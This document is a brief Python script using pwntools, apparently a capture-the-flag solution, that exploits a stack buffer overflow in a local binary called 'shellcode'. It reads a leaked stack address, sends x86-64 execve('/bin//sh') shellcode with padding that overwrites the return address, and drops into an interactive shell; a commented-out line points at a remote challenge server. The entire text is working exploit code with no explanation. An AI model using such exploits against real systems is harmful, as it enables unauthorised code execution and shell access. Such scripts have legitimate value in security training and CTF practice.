from pwn import *

#r = remote('120.114.62.210', 2119)
r = process('./shellcode')

raw_input()
s = r.recvline().decode().split()
s = s[-1]
print(s)
s = int(s, 16)
shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
length = len(shellcode)
r.sendline(shellcode+b'a'*(0x70-length+8)+p64(s))
r.interactive()
